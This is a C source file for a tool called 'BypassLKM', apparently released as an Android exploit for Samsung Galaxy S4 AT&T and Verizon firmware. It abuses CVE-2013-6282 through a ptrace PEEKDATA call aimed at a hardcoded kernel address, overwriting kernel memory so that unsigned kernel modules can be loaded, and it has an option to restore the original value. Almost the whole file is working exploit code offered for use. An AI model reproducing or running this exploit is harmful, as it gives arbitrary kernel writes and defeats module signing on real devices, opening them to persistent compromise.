/*
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <unistd.h>
#include <sys/syscall.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/system_properties.h>

// ATT SGH-I337 MK2
unsigned long att_address = 0xC00B9C28;
// VZW SGH-I545 MJ7/MK2
unsigned long vzw_address = 0xC00C9D58;
unsigned long value = 0x0;
unsigned long origvalue = 0x1a000002;

bool bChiled;

void ptrace_write_value_at_address(unsigned long int address, void *value) {
	pid_t pid;
	long ret;
	int status;

	bChiled = false;
	pid = fork();
	if (pid < 0) {
		return;
	}
	if (pid == 0) {
		ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
		if (ret < 0) {
			fprintf(stderr, "PTRACE_TRACEME failed\n");
		}
		bChiled = true;
		signal(SIGSTOP, SIG_IGN);
		kill(getpid(), SIGSTOP);
		exit(EXIT_SUCCESS);
	}

	do {
		ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &bChiled, &bChiled);
	} while (!bChiled);

	ret = syscall(__NR_ptrace, PTRACE_PEEKDATA, pid, &value, (void *)address);
	if (ret < 0) {
		fprintf(stderr, "PTRACE_PEEKDATA failed: %s\n", strerror(errno));
	}

	kill(pid, SIGKILL);
	waitpid(pid, &status, WNOHANG);
}

int main(int argc, char **argv) {
	char devicename[PROP_VALUE_MAX];
	char buildid[PROP_VALUE_MAX];
	unsigned long int patch, address;

	printf("\nBypassLKM patch by Jeboo\nusage: -r will restore kernel to original\nBig thanks to fi01 & CUBE for their awesome CVE-2013-6282 exploit source!\n\n");

	__system_property_get("ro.build.product", devicename);
	__system_property_get("ro.build.display.id", buildid);
	printf("ro.build.product=%s\n", devicename);
	printf("ro.build.displayid=%s\n", buildid);

	if (strstr(devicename, "vzw"))
		address = vzw_address;
	else
		address = att_address;

	printf("\nPatching kernel @ 0x%X: ", address);
	if ((argc > 1) && (argv[1][1] == 'r'))
	{
		printf("restoring original value.\n");
		patch = origvalue;
	}
	else
	{
		printf("unsigned modules can now be inserted.\n");
	        patch = value;
	}

        ptrace_write_value_at_address(address, (void *)patch);

	printf("Done.\n\n");

	exit(EXIT_SUCCESS);
}
